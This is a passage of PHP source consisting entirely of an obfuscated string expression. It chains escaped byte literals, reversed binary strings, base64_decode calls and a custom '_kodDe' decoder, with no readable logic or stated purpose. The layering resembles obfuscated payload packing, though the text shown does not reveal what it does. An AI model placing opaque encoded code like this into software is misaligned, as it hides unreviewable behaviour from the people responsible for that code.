')."\230\112\306\162\57\151\50\262\236\110\65\344\323\151\223\261\372\151\265\233\64\113\66\310\302\142\145\33\64\75\141\101\23\176\100\66\172\0\53\22\221\312\112\11\53"."\x5e\x51\x2a\xf9\x2\x52\x6d\x30\xe8\xf7\x7a\x2\x12\x3c\x8d\xc9\x29\xe2\xab\x77\xd2\x16\xe6\x3a\x7d\x44\xfc\x61\x1\x95\x72\xd8\x32\xa0\x50\x26\x4d\x25\xd7\x53\x24\x6\x99\x42\x7".strrev('”]¨úq£T;ÕôWÙ'."\r".'ÁÁÖSÇpƒ°l`å¿~â3ƒ¢€åÆß£Àq‰¼').strrev(''."\n".'Ë€å,´2]@+M=X2@îë(:Ğr# í%^•ù1àpZCUà¦aÇE').strrev('ŠÈ8±yB…'."\n".'ƒ¦i¤!,¤|	!ƒÃ“Ú¹ò×S£„ràà¬‚wHİ¯ÁÊ±').strrev('áüS0”†(<E{n»XáÍ„ğ­6N¡Áü‹B]ÒD"xª¡7ŞØÁ')."\x17\xd5\xfc\x42\x95\x33\x8a\x76\x91\xcd\x7e\x1d\xa\x3b\x8d\xc8\x9d\x61\xa1\x3b\x53\xee\xa4\x7d\x15\xc9\xc5\xe1\x90\x92\x18\x48\x70\xb1\xaf\x5e\x90\x1d\xad\x31\x86\x3d\x8\x95\x8b"."\341\143\361\45\140\70\306\320\365\310\43\216\240\200\244\210\307\60\322\202\257\103\156\20\76\247\140\216\237\255\220\232\205\1\225\27\350\25\115\12\162\362\230\47\274"."\200\154\20\256\34\336\161\222\220\102\323\370\124\104\140\243\371\330\23\50\164\54\375\302\50\107\24\12\2\11\166\340\20\116\57\210\330\116\276\344\102\224\374\250\132"."\14\303\75\226\141\2\65\133\10\33\155\205\353\322\242\146\7\324\254\170\323\301\123\71\171\346\247\3\104\134\333\335\114\375\120\141\114\276\370\115\212\203\334\260\70".strrev('áşüæˆ0î”Ãd¦Ê	q'."\r".'˜ÃÄ'."\n".'İ&N=Ó‘¶KIØÂªÃÑƒÍ.q-Ü„€').base64_decode('UaFYh9zLTy5LHWGfGOYAuwISgtZGcbR+qEgTk3qLRcUtqBp+ALtiYTTTiFY0')."\12\357\142\150\130\103\370\117\237\102\55\7\20\222\33\313\150\32\71\311\142\202\64\311\166\246\265\36\36\240\207\21\67\300\352\245\1\361\325\135\160\63\65\102\132"."\52\22\107\106\314\14\110\267\161\130\50\224\263\223\135\313\261\120\220\124\130\220\35\20\266\124\133\224\167\156\241\123\4\313\163\71\45\233\204\105\204\315\146\151\226"."\336\346\125\222\12\111\40\140\273\164\114\32\135\200\73\43\357\163\216\112\341\210\345\373\173\221\201\30\26\102\112\227\330\300\146\2\111\60\56\353\56\35\364\317\107".base64_decode('zkkHYb3yLKGdTAQ1WqwGzvFrVIyA+8ebVE2YAsmjRu8EeUHh2YylidQLwsxV')."\260\130\234\303\162\214\266\224\54\166\64\270\52\20\65\167\361\303\113\74\372\304\227\101\370\266\210\103\302\53\172\206\75\66\242\104\227\141\152\71\236\43\104\161\266"._kodDe('KbqFChAmP5jl9iaTZ1E5/P8fD99AZhfY+CCyPwIs/bPNhG9Io7YpdwiQbEYVQQ==')."\x82\x7b\x3c\x4c\xaf\x64\x8b\x11\x6d\xdc\xb8\xb7\x97\xbf\x8e\xe3\xa6\x60\xc7\x2e\x7c\xda\xb8\xe4\x64\x32\x48\xef\x1a\xc5\x70\x61\x51\xf1\xea\xa5\x78\x43\x48\x61\x81\x35\x25\xc4\x8a"."\27\367\244\323\374\75\323\36\37\262\12\336\263\142\45\61\145\310\152\15\210\355\247\17\17\305\322\30\147\51\62\143\126\346\213\277\56\333\231\64\53\135\32\372\44".strrev('¡ôp‚‰ÄvÏHò¸O0Lµf!ŒÈ£t¼;*ÍJ]^§-ñ@‚').base64_decode('YyRmWg7tEGpDQFUL9MHWwJBs0LWMLwhQvzg+2Msp9A4MUZh+tdhEwfrBE3+o')."\x36\x69\x36\x6b\x8a\xb3\x7\x1b\x9e\x5d\xb1\x1e\x87\x2e\xdf\xbf\xe7\xdb\x67\x9f\xb8\xec\x1d\x1c\x9b\x50\x45\xd4\x20\x16\x43\xad\xa4\x5f\xe0\x30\xd7\x4b\xba\x74\xee\x67\xd9\x9d\x2f".base64_decode('ndxw8a1vPvDY8DMmvX3erdn0495ke3pA2fr49kW+B1+45swrHmo69sUVox/7').base64_decode('/sSHmifOCK3fe8reU5zve496aOba9EW/OOKmW7TwpnWP7r3G6Gjq2mnKGyd3')."\x2e\x1b\xf7\xe9\x57\xeb\x8c\xa7\x47\x2e\x18\x98\xb8\xed\xcb\x27\x3e\xba\xf0\xbb\x45\x5f\xfc\xe7\x96\x57\x2e\xa8\xfd\x48\xdf\xbe\x7a\xdf\xfc\x2d\xe7\x5e\xbf\x6b\xc3\x9c\xbb\xaa\x5e"."\175\355\334\212\315\57\367\377\362\257\222\343\356\355\322\364\47\375\55\173\333\306\257\277\165\320\253\134\53\175\123\27\137\75\372\333\77\237\66\360\227\311\372\237\37"."\xec\x6c\x1c\x37\xe6\x3b\xc7\x86\xed\x3f\x35\xde\x78\xd8\x1d\x4b\x67\xa8\xaf\x3c\x72\x7d\xd9\xb3\x4f\xc7\xeb\xef\x7b\x29\xb9\x68\xe9\x6b\x97\x7e\xf2\xe0\xf0\x19\xce\x3b\xa2\xb3\x8e".base64_decode('cn7yyL4dlctXXuP+U9OuZbfIJ51w82erWn9984XTzj6wfeTIU055/7QNv2q6')."\275\256\377\235\357\266\235\177\104\172\326\357\347\135\174\311\217\303\3\223\112\126\275\365\234\76\126\76\255\257\361\345\17\137\215\114\71\373\273\33\77\276\141\367\337".base64_decode('+lu/8X9xw+S233hHLL760I/PG/HmSYdfetNdw+ZrT7VXvHJn7i8V0w7sc+5e').base64_decode('l9l+yAV7Lr5klvLYNsd7R5/b803T9acvW/Bi/pq92++PtuxfuF0+bnX5lkfW')."\115\377\346\262\313\76\37\350\253\374\100\75\346\272\215\145\237\316\217\337\270\314\361\316\77\33\156\57\257\132\376\67\367\337\307\336\327\264\171\175\117\315\273\357\17".base64_decode('v2Hr4O3z7hr76ulq14OOM+be/aeDb9n29nsrO247//lhn88bFfr9yXXXrzyy')."\xe9\x9b\xd4\xb6\x6b\xee\xce\x3f\xb5\x7c\xe1\xcd\xa7\xcd\x7c\x71\xdc\x51\xee\x15\x2f\xac\xe8\xf9\xe5\xae\xfb\x3f\x99\xbf\x6d\x63\x49\x5b\xfe\x83\x8f\x67\x6\xde\xdd\xb1\xf4\x93\x9e"."\23\324\323\217\175\366\317\257\154\76\344\266\5\367\216\377\354\174\347\212\135\45\77\14\237\353\331\376\340\347\47\165\56\313\164\75\334\345\273\373\206\231\127\277\261"."\352\312\167\267\167\266\270\343\257\237\363\303\375\377\374\376\203\5\177\232\65\332\241\56\376\373\301\227\36\176\250\271\371\330\332\317\217\76\361\235\221\143\252\16\232"."\xdc\xb4\xe1\xd8\x55\x97\x3c\xb8\xf3\xd8\x63\xa5\xb6\xe8\xca\x7f\x3e\xb2\xfc\xe1\x81\xf9\xb7\x34\x1f\xb5\x78\xe7\x2b\x77\x5c\xf3\xee\xc2\xe3\x8e\x3b\xec\xb9\x6b\xf\xfc\x6b\xf2\x66"."\x79\xf9\x25\x1f\x5e\x5e\x33\xfc\x94\xc3\x16\x8c\x8\xb4\x87\x2e\x1f\x48\x2d\x3b\xbc\x3e\x59\x71\xea\xb6\x13\x3f\x1d\xf9\xe5\xe6\x9\xb7\x6d\xda\xbd\x2c\xb3\xdf\x3b\xf1\x83\xa3\xce"."\xba\xff\xaa\x92\x35\xd5\x57\xd5\x24\x2e\xfb\x57\xff\xe3\xdf\xf6\x9f\xb2\xef\xaa\xdd\x81\xe6\xd7\xee\x5d\xbb\xed\xa4\xaf\x5e\x5a\xba\xf4\xae\xe7\x7e\x77\xf5\x97\x6f\x9d\x38\x45\x2d"."\31\21\174\365\340\354\237\37\72\266\171\137\164\317\213\345\67\215\216\147\363\251\375\363\36\177\43\226\377\362\253\65\313\236\152\114\257\73\374\370\172\347\233\263\176"."\xb9\xee\x81\xf6\xc6\x91\xfb\x7f\x79\x73\xc7\x88\x95\xaf\xbe\xfd\xf0\x11\x6f\x8f\x98\xfb\x97\x67\xf5\x8d\xd1\xa5\x2f\xcd\x9d\xdf\xdd\x3b\xe7\x8f\x1b\xb7\x64\x12\x2f\x3c\xb8\xe3\x9c"."\x59\x47\x96\x4c\xbb\xff\x83\x81\x5\xfa\x2d\xef\x8d\x6d\x78\xe9\xeb\xe1\xdd\x4b\x57\x9e\xfd\xf4\xc8\x29\xbf\xfa\xc7\xb9\xf7\x3c\x71\xd5\xa9\xf7\x3d\x93\x59\xfb\xe1\x96\xa7\xb5\x78"."\305\225\207\256\236\275\363\325\75\7\146\56\364\216\272\117\176\175\341\331\227\375\156\367\33\347\36\324\170\210\267\67\333\167\347\221\216\63\214\115\377\210\176\275\361"."\205\167\302\143\137\336\277\341\225\223\67\37\132\371\171\325\253\357\365\66\34\136\273\256\346\215\213\272\215\225\361\47\256\366\77\77\146\135\311\346\56\243\43\140\256"."\151\272\333\323\120\372\156\347\330\326\121\167\175\360\236\143\303\216\157\246\76\271\247\266\262\357\374\325\27\314\237\322\325\374\335\346\375\177\255\112\154\36\367\371\341"."\xdf\x5c\x77\xdf\xa2\x5f\xdc\x7e\xe2\x61\x5b\x16\xb4\xde\x7f\xcf\xf2\xf5\x1b\x1a\xff\xd8\xba\xe4\x3d\xe9\xb1\xb6\xb7\xf\x7a\x44\xff\xaa\xe6\xa4\x35\xee\x61\xf1\x8d\x75\xe7\x95\xb4".base64_decode('taVu/t1fjz/24n+NWTCt9K+Pz669KbLq+DfntK8/Mn1PcscFG0dlrglvfW7K')."\xc5\x27\x84\x96\x9f\xf0\xab\x3d\x73\x8e\x2f\x9d\x5c\xf6\xe1\x94\xbd\x23\x2a\xee\x7d\x6e\x61\x7f\xdb\xbe\xe3\x6e\xfc\x3c\xdb\xd7\x38\xfc\xb8\xcb\xfe\xf8\xfa\x1f\xb2\xa3\xee\x4b\x3b".base64_decode('tp5zy13zpl9708m3zc5sOOrOB95ac4n218OO2Jnzrlr+wk1z3yl/8+I1+5c+')."\x7f\x7a\x56\x7f\xe3\xf4\x47\x2e\x78\xfe\xe8\xc3\xe\xf9\xe7\x83\xd7\x6f\x9c\xf8\xd0\xdd\xb\x2e\x5b\x96\x3f\xfd\xad\xf7\x36\x6f\x5b\x3f\x73\xf6\xab\x57\x74\xef\x9e\xfc\x82\xb3\xeb"."\205\371\341\107\22\313\136\134\223\334\162\360\125\211\165\357\176\177\301\143\345\117\236\271\340\353\133\135\163\236\251\364\206\47\325\277\237\167\17\126\335\276\143\136\154"."\134\367\11\207\277\354\374\370\46\365\360\313\366\36\273\340\345\324\261\117\47\174\347\157\213\255\351\175\146\321\335\306\123\363\172\76\50\333\374\140\363\272\51\356\265"."\x1b\xa6\x9f\xe2\x9a\x6a\x6c\xf3\xbf\xfb\xb7\xb1\xef\x7e\x36\xf6\xa3\x50\xf2\x34\xe7\xef\xcf\x3b\xf3\x2e\xf3\x93\x5f\x7c\xbb\xe4\x93\x67\xe\xdd\xd1\x78\x8a\xfb\x84\xdf\xfe\xfa\xfc"."\xba\xc3\xf\xe9\x3d\xf7\xcc\xd9\xae\x39\x2f\xbc\x76\xc4\x25\x47\x9f\xf1\xd1\xf0\xde\xeb\x56\xef\xef\x2f\x19\x76\xdd\xd5\xc7\x7c\x6e\x7c\xfc\xf7\xe6\x3b\x1a\xff\xb0\x65\xc7\x67\x57".base64_decode('PZF469n6+7aW1/6UG3v7wK0PfXf+ZZd9ePBFweQzzWWrps/8+qSYe+TOe9vW')."\137\321\261\172\330\237\376\162\301\201\367\317\72\53\377\115\330\370\255\177\316\75\23\315\133\356\215\274\263\343\255\151\353\206\57\37\376\353\150\366\242\333\236\175\140"."\xe5\x63\xd9\x17\x4b\x3f\xea\xb8\x72\xc9\xf1\x23\x9e\x3a\xf9\xb5\xbf\xbe\xee\x7c\x7f\xc2\xb6\xbf\xaf\x9c\xd3\xb8\xf4\xbd\x44\xfb\xad\x8d\xb3\x5a\x77\xbe\xf3\xde\xf6\x3\xf7\xb6\x8d".strrev('ÿz’ßmôÎ7Õ—¾µÇD÷~÷‡üÿ»êÑş\\]<[§ÁübGÑé=Ò;¿o').base64_decode('/n98v+nsmp92vrlp+o+fvfPgd66f/v2XSVffHK1Z9O1L7zzodv/2Pzs/+bH0')."\315\31\337\157\335\375\307\240\373\302\237\126\134\231\77\176\377\243\177\176\354\213\177\317\375\247\366\343\241\217\274\344\233\60\353\342\153\276\76\342\304\143\216\355\63".base64_decode('5l5662yzp2lc8i9XHvziKRvfOPXrzZFfV9wp7zpq5SlfTwnEJ99zxb6jD9p2').base64_decode('uH/puRPaVz5pPJQenzyrdetLD48MZ9a/vvOKLdef+bYv8fDv3LfXnvvlvcZv').base64_decode('Rr1SufaGyPG7xh302v0P1u55YmfiLyO8Vc3Dhz317cLURdq+lz75+/Ofzd9x')."\334\243\261\47\356\172\145\364\271\267\137\163\347\264\17\336\177\172\240\363\231\111\373\136\131\166\301\340\15\37\215\311\375\317\213\365\345\73\366\56\374\374\113\377\212"."\x55\xe7\x7f\x90\xfe\x61\xf7\x95\x57\xfc\xc1\x95\x1f\x39\x7b\x4f\xff\x92\x65\x9f\x5f\x5e\x7a\xea\x92\x49\x2f\xc6\xce\xbf\xb7\xb6\xf6\xf3\x5b\xd6\x1d\x38\xa6\x64\xe7\x8b\xd7\xad\xea"."\73\170\377\173\327\335\177\121\343\151\215\257\116\231\270\174\331\363\277\75\352\260\271\155\145\377\170\172\326\74\175\366\355\253\126\74\173\366\326\207\237\367\135\276\370"."\xad\x33\xfe\x9d\xb8\x4d\xf2\xef\xff\x1f\xf5\xf0\xc0\x13\xa7\xee\x38\xe7\xaf\xaf\x7a\xdf\x7f\xe5\x99\xb3\xd6\x2f\xed\xda\x3d\xb0\xf4\x8b\xad\x67\xad\x8\xff\x69\x73\xe6\xcc\xcf\xef".strrev('_æìÎÅí<Óº~/¯ı#Õ×s¶4Î³\''."\r".'†úúÙ/oÀ¨û}®Kûh|').base64_decode('+fvIws+6blt/79Q3Ptn1p9j1s1Z71rsm/LTgnh9uuWP/1sOerH5m6vKGv287')."\357\375\341\373\157\236\164\367\125\217\247\2\207\377\376\333\73\333\276\132\364\155\117\371\223\213\66\105\163\247\154\175\47\376\344\216\165\25\13\36\175\357\201\236\213"."\27\174\364\301\217\117\275\277\177\373\260\227\107\345\266\74\60\171\365\332\315\163\336\75\272\351\261\75\143\166\114\172\164\127\40\70\363\364\121\215\313\327\272\27\134"."\172\105\103\343\231\147\167\234\126\353\120\215\361\123\176\134\377\362\355\75\243\176\271\46\361\326\126\317\153\355\177\156\310\16\173\367\246\323\226\257\365\257\175\375\244"."\370\364\3\267\235\361\320\157\302\303\176\267\175\334\243\201\155\303\217\34\377\321\127\7\72\126\255\155\171\177\355\246\237\126\36\361\361\13\7\366\237\30\373\52\160".base64_decode('Z9v39y3c47ilpftRyVjevWm5POzxB9dP/P7wVz59dHjp9tuvHX3cYKhn/4Zd')."\63\257\134\370\374\273\253\336\373\303\372\147\117\230\77\146\153\306\373\344\153\373\256\373\315\206\121\257\77\162\347\222\263\6\17\271\344\235\5\225\257\225\75\167\322"."\351\217\77\162\140\343\227\277\130\163\362\35\377\136\77\165\327\61\313\257\175\347\351\137\237\343\273\160\317\25\356\103\335\13\236\375\362\212\77\316\72\363\302\226\257"."\xa7\x7c\xed\x7e\x29\xbf\x66\xc1\x7\x3d\x6b\xb6\x8e\xd9\x55\xb2\xe8\xac\xb9\x9e\x55\xd\x1f\xbc\x7e\xae\xf7\x7f\x42\xcd\x6f\x7d\xb6\x74\x6a\xed\x81\xb1\xb1\xea\xb7\x97\x66\x46\x9d".strrev(':ß—²ìõşÜOëaı¿¯ç{-ı·wáæ=î_–Ã«~¯ÇıŸÚÑÒ³ä')."\x4a\xd7\x37\x8f\x7b\x22\xf6\x55\x57\xd3\xe6\xd3\x4b\x7f\xf8\xe1\xde\xdb\x2e\x7d\xea\xba\xe5\x6f\x9f\xf5\xed\x29\xbf\x8d\xdf\x77\xcc\xfb\xff\x3e\xf5\xb6\x65\x17\xbc\xf9\xe1\x84\x39".strrev('Éãerò<ì\\_›æ;>°Åf;Ü7'."\r".'­Ówaö,ge¤(î_ò‡/¡áôŸ')."\307\165\376\353\260\123\223\173\373\126\264\35\374\355\121\317\135\273\260\377\205\13\272\156\77\263\154\353\342\151\173\376\130\371\333\135\13\153\76\321\74\367\216\70\170".base64_decode('yhm+W7+66KC9Lw3bnzm55+zFN54+4YUzFm/a0HLppuu9L5z3/Qk3RSfr/7y2')."\xaf\xf6\xf7\xcf\x3f\xf2\xf1\x89\xfb\xda\xe\x3b\xb2\xea\x8d\xf7\xdc\x23\x7e\xfa\xf1\xfb\xdb\xdc\x37\xff\xf4\xed\x83\xf7\xb8\x2f\x18\xf8\xf2\xb9\xb6\x53\x7f\xfa\xfe\xf5\x17\x2f\x1b"."\xd1\x7e\xc1\x81\xbd\xdf\x8f\xf8\xcf\xf7\xaf\xaf\xbe\xda\x7d\xf6\x92\x5f\xae\xbe\xe9\x9e\xef\xce\x8e\xfd\xe7\xb3\xcf\xe\x7c\xf1\xd9\x8c\xf6\xb\xfe\xf5\xcd\x57\x3b\xbf\x73\x5f\xf0"."\343\23\53\256\236\276\345\337\177\323\332\156\276\360\253\217\56\274\360\245\324\261\367\237\121\32\371\144\252\164\306\223\276\175\237\254\71\145\165\176\125\337\343\147\74"."\252\75\171\364\252\15\337\75\367\301\73\273\167\117\172\354\210\107\122\233\356\135\327\173\307\216\35\37\176\366\305\107\303\317\74\363\330\253\33\166\276\372\315\201\135".base64_decode('+5/64bhr7t63fc2N7+77oDf6ifPf0so3brjnnwN3RVfd/fDgbeWnZn86/slf')."\364\134\126\162\354\275\363\357\364\335\163\327\1\107\305\175\157\134\167\260\362\305\3\313\37\237\247\17\153\333\267\361\225\360\252\362\367\146\65\275\130\361\233\252\73"."\156\230\71\347\253\21\153\257\171\54\376\326\165\155\147\316\36\375\254\36\134\274\172\336\77\26\154\70\77\372\352\41\257\307\276\16\255\315\237\21\376\370\302\356\153".base64_decode('b1m97lSqyl41bhIOjKsiShFEX6Qvk0uovfTtN6urXQYRKPu7jIGeLFU/rSLl')."\xa7\xd0\x86\x26\x8f\x25\x81\xf1\x95\xe4\x96\x21\x6e\x68\x7d\x5d\xca\x20\x8e\x4c\x9c\x40\x5e\xd6\xc6\x51\xb9\xa5\x5b\xee\xe9\xec\x22\x55\xaa\xe8\xc5\x84\xd6\x3b\x98\xa7\x12\xf3\x78"._kodDe('LMiEEYn5Jn26ytIFoyU7O1WvbXbj4Y7BFUVEWpzW6CobyiIYV3dGPtovA+OGRQ==').strrev('a'."\0".'8Dğò'."\r".'û:{z%q‘ÇNÉäßÚ!¤	øĞÒ^ñÒfLÏaäıò:äÌÀH')."\302\144\62\317\11\225\244\201\301\116\115\311\164\21\360\45\214\316\36\71\116\240\134\65\221\114\145\312\24\62\350\211\123\110\37\335\252\234\314\147\211\46\127\62\157"."\350\251\101\362\360\231\110\146\72\73\124\2\277\211\125\244\342\344\11\144\146\152\246\337\30\240\317\140\235\275\262\336\115\137\345\172\200\160\67\110\225\51\314\124\257"."\234\66\10\154\47\114\40\253\140\366\16\52\311\156\2\211\311\24\244\172\56\243\145\273\310\125\134\227\321\333\75\230\44\223\37\107\201\325\327\241\307\173\72\111\107".strrev('é¦ÎéŸÖµmÉå÷uI™Ù™r;¤Ù/¿Â•)ó{¤‹A<Z]â(ù`Èt±‘\'ã')."\x5c\xc7\x93\x51\xaa\x66\x97\xde\x4d\x87\x30\xa5\x92\x40\xa0\xaa\x92\xf4\x9a\xd4\x7\xcc\x5c\x2f\x99\xda\x44\x32\xc0\xfe\x4c\x57\x27\x40\x17\xd2\x47\x3e\x33\xd8\xd3\x4d\x7a\x8f\xf7"."\xf\x76\x2a\xbd\x44\xe6\x9c\x44\x57\x6f\x1c\xc5\x98\x4a\x82\xee\x13\x27\x93\x96\x26\xd1\x95\xce\xf5\xc8\x6a\x62\x80\x54\xcc\x77\x28\x9d\x71\x8d\xa2\x3c\x59\xd6\x78\xc7\x40\xb2\x87".base64_decode('IrU+kOiJ5+mUB7sHenIEGClNNfoSZGzZnpzRl6L3sT3yoJ4nWJAbMHqT9Ilw')."\xc2\x58\x2\x8c\x44\xb6\x3f\x9d\x49\x9a\xb4\xe3\x4a\x8a\x8e\xa4\x9f\xfe\xac\xd9\x45\xd5\xf6\xfa\xe2\x3d\x5d\xdd\x39\x83\x62\x73\x15\x85\xdb\x38\x8a\xe8\xa4\x72\x47\xa7\x9e\xe9\xed"."\42\103\230\102\227\70\21\357\114\346\62\124\145\274\63\227\64\362\4\306\231\376\104\107\267\111\106\71\205\356\233\376\336\356\316\154\17\21\332\345\164\302\34\114\22"."\14\356\60\23\162\134\47\260\232\74\211\140\374\330\111\4\256\152\272\247\33\40\61\31\346\44\62\250\164\377\100\137\167\134\243\64\205\124\32\117\327\113\33\350\63"."\365\136\262\333\47\217\47\323\317\232\35\106\127\212\364\64\156\334\70\112\112\310\232\116\232\122\105\367\52\151\157\322\104\122\263\267\123\66\265\76\162\105\321\253\152"."\175\212\101\336\31\272\362\275\106\226\232\207\214\253\144\324\260\222\6\110\233\363\62\344\136\240\126\116\164\323\133\143\303\224\315\274\141\53\100\255\35\22\242\276\153"."\267\242\120\155\113\252\317\311\237\267\215\74\322\20\247\371\374\346\1\136\36\11\317\340\60\32\26\313\46\262\246\220\15\142\226\134\170\377\16\57\110\160\54\154\152"."\x3a\x7b\x86\xc7\xa\x3e\x2e\x38\x2a\x97\x75\x12\x95\x55\x96\x12\xc9\xb8\x25\x9f\xa5\xd2\xab\x14\x7b\x4e\x87\x3d\x3d\x8e\xc0\xc5\xd4\x27\xe0\x1f\xba\x19\x90\x8d\x8c\xa1\xf4\xe4\x15"."\xa6\xcc\x8d\x4b\xbb\x28\x8c\xe2\x2\xac\xf1\x5d\xb7\x29\x1b\xdd\x2e\x31\xd9\x29\xe6\xaa\x59\xd0\x75\x3a\xed\xb2\xda\x4e\x41\x43\x1a\xba\x34\x31\xae\x3a\xb\xc1\xd3\x2a\xa8\x3c\xc0"."\270\160\1\311\1\300\337\66\205\64\16\166\1\122\326\165\24\264\347\162\111\215\245\46\51\352\141\10\20\54\316\14\300\250\20\56\6\160\241\127\6\51\27\237\121"."\x19\xc\x92\x7\x14\x78\xcd\x26\x75\xc8\x20\x21\x59\x2d\x75\x0\x2c\x90\xa8\xda\xb3\x64\x6a\x34\x4c\xe0\xe5\x86\xf0\x72\xa3\x5e\x5\x58\x89\x79\x78\xa8\xae\x21\x86\x65\x99\x77\x4c".base64_decode('5gOCIX4BinOgqrxPMKOJdSpmjOwV0kStJ+yri7V4qDqlnMu5jWS34Yb6Emqv').base64_decode('4lfjbmh3AofmitMXw0RKSXTH5Limm/R+Ng+1YgnbQ88qVeNXsASIfMDkjYMn')."\x88\x68\x6d\xdd\x6d\x16\x84\xb7\xee\x53\xf2\x7a\x88\x2c\xba\x1c\x12\xee\xd0\x21\xa1\x67\x49\xc9\x6a\x6d\xe4\xab\x97\xd8\xfb\xae\x88\xd5\xe2\x20\x75\x25\x97\x96\x13\x6c\x80\xb9\x81"."\242\313\52\16\107\174\23\265\115\300\102\40\354\123\260\144\202\325\317\323\5\261\274\5\152\165\151\331\60\270\56\55\172\41\346\303\305\121\366\214\23\6\15\262\227"."\157\135\111\252\124\265\121\311\240\222\124\135\30\75\323\60\235\312\104\132\221\165\313\23\321\264\31\271\124\16\132\153\232\123\147\20\333\61\362\26\26\23\372\45\141".base64_decode('rtsupqbtz06UTLjqawWzSliM1OBPiiDNC9W0hkqvZ0/yUjjf2akYZjWy3JDG')."\110\140\54\223\134\343\101\0\155\260\11\256\111\40\210\0\101\136\157\242\131\336\57\103\133\20\16\345\263\220\44\125\13\243\352\40\263\162\361\262\362\30\236\257\44"."\x47\x12\xc8\x8\x73\xe8\x23\x5\x68\xdd\x66\x2b\xe0\xc1\xe8\x9c\x6c\x2d\x0\x7c\xc1\x36\x4c\x1a\x48\x17\x8d\x10\x0\xd2\xa4\x21\x58\x9d\x85\xf8\x32\xc2\xea\x68\x32\x3f\x53\xd5\x14"."\141\236\3\133\75\313\124\313\214\264\114\137\323\14\260\377\325\254\302\20\40\157\160\115\134\106\70\160\34\52\160\306\22\151\215\22\170\200\74\261\244\112\12\373\175"."\265\261\172\137\210\37\320\324\324\310\323\342\213\205\303\101\201\256\124\13\204\26\32\117\360\227\130\30\343\106\24\360\165\103\124\172\61\214\76\115\47\360\203\26\227"."\x50\xd7\x35\x2c\x11\xdb\x2c\x80\x4b\x75\x4d\x9e\x10\xd3\x67\x9d\xe0\xaa\x74\x55\xf1\xb2\xa0\xc3\x18\x54\xeb\xad\xa1\xb6\x5c\xe1\x88\x27\x54\xc4\xfa\x16\x5b\xe5\x12\x78\x13\x4b\x5c".base64_decode('UqEp2CbVBf2tzYEwNjfF6YGgkI+0Fkk2tc0tzCbNe1v8njqv5AtEglQtmSmf')."\x21\x85\xf4\x30\x8b\x53\x10\xe8\x86\xc2\xac\x6e\x49\x7d\x1c\x11\x95\xe6\xc5\x16\x59\x4b\x4\x43\xe7\x3b\x4a\xa3\x25\xd1\x8a\x68\x59\xb4\x7c\xa1\x2b\x6a\xb4\xbb\xc5\x25\x21\xe7\x60"."\x4b\x3d\x99\x52\x35\xb\xb1\xc3\xb3\x39\x1c\x9e\x4d\x6c\x2d\x82\x21\x4f\x9d\x9f\x76\xf\xce\xe\x12\xc\xd6\xf9\x70\xe0\xd3\xeb\x1e\xd8\xf5\xf8\x55\x9f\xae\xbd\x6f\xf7\xf2\x2b\x41"."\x43\x7b\x6e\xfa\xd5\x9e\x5f\x3f\xb2\x6b\xcb\x95\x7b\x2f\x79\x6a\xf7\x7d\x2b\x3f\x7d\xfa\xaa\x3d\xd7\x6d\xda\xb3\xf2\x62\x32\xe6\xbd\x9b\x1e\xdd\xf5\xd4\x33\x9f\x5e\x77\xe7\xee\xfb".strrev('[-îÕüŸ»Õñû·ŞW=şş¹ï·UÏz~­ö“dî+îÀõİö3ŠZoO±á¹ìÖ')."\x1c\xa0\xf6\xbe\x4b\xaf\xfc\xf4\xa9\xfb\xf6\x5c\x7e\xc3\x9e\xdb\x2e\xda\xf3\xf0\x8a\x3d\xbf\xb9\x72\xf7\x15\xbf\xdb\x7d\xe3\x9d\x9f\x5e\xb5\x69\xf7\xad\x97\xec\x5e\x76\xe5\xde\x4d"."\327\217\264\43\17\216\317\247\340\47\117\353\356\5\121\243\242\14\203\64\152\214\201\340\54\7\277\145\120\263\31\374\122\45\116\200\162\141\150\1\25\250\363\332\55"."\x5\xc4\x28\x31\x53\xae\xc0\x58\x1\x91\x9a\x71\x5f\x6\x31\x73\xa6\xf1\x18\x32\xe\x29\x1d\x72\x14\x8b\xc9\x9a\xb\x83\x12\x6\x53\xef\xd\xd7\x85\x7c\xb5\x5e\xa2\x3b\xcb\x16\x6a"."\x34\x52\xcb\x24\x2f\xf4\x20\x35\x1c\x9a\xc3\xc2\xcc\x5c\xa6\xc0\xb8\x5c\x2a\xa3\x8\x5c\x2e\x59\x26\x22\xbb\x12\x5a\x3a\x9f\xc9\xa2\xc1\x4a\x25\x50\x69\xa6\xc4\x1\x69\x3a\x62\xbc"."\244\22\170\46\201\4\45\1\266\133\31\264\72\105\372\176\245\363\112\35\225\216\252\162\211\130\236\343\32\304\322\134\52\41\332\234\254\236\245\23\107\334\22\253\162"."\124\226\113\45\271\356\22\62\56\16\127\60\372\30\56\151\110\262\243\214\14\130\34\56\57\13\10\242\141\352\262\12\330\37\51\341\140\111\254\76\370\265\130\217\47"."\134\274\6\136\47\120\302\236\46\171\2\365\326\222\330\350\274\245\124\222\263\111\220\203\341\53\56\163\151\271\24\47\32\311\105\62\121\65\13\60\152\54\300\50\33"."\103\150\103\113\43\133\157\254\104\54\141\153\24\74\54\331\240\13\105\122\321\122\301\124\274\132\264\254\6\246\1\26\7\227\7\1\226\323\255\14\360\226\0\11\142"."\31\164\5\141\72\133\304\42\171\310\33\100\11\346\235\360\74\63\106\47\45\157\304\34\275\171\36\233\3\305\145\211\236\374\314\227\0\264\253\361\106\352\232\60\226"."\207\5\64\117\306\107\133\20\225\203\123\262\240\110\232\32\206\222\162\170\273\100\202\160\4\52\347\13\64\4\103\315\330\236\44\134\327\344\155\366\270\10\341\306\230"."\200\313\103\316\105\252\221\112\41\345\303\111\245\26\360\243\216\50\310\42\250\127\260\257\142\46\340\121\60\24\162\235\144\60\144\365\45\144\124\50\243\52\65\245\330".base64_decode('Wpc0yVxfBEORGAAAIc8C1S0VTghB1RSaRfQy/lhOAGGUGqPHqYcM0Dhssy4Y')."\150\360\121\323\231\372\270\45\257\76\344\203\26\242\244\133\211\266\20\343\372\7\40\222\353\113\262\60\267\211\204\31\354\104\7\21\176\240\303\34\301\121\7\354\46"."\34\140\141\316\30\202\10\124\371\343\264\265\255\236\205\233\230\125\33\314\10\206\204\210\47\344\151\16\263\150\250\15\320\152\230\46\130\167\65\173\302\21\60\253\100"."\153\63\247\347\176\317\34\200\12\101\316\162\120\132\134\346\252\230\121\36\305\266\53\70\210\177\146\322\30\324\371\157\137\124\345\220\46\56\51\47\145\250\265\107\314"."\114\1\171\50\306\173\231\355\217\371\203\215\70\216\34\210\170\263\111\316\273\113\363\45\300\204\106\70\23\152\320\203\211\341\272\4\60\124\302\6\161\122\40\330\346".base64_decode('4d4ohAycQuzwJO6jwr1gfrQv6gJcgLGQm6TU10qUv6iDIh2xjyC1PfSsXOgg').strrev('>¢Jä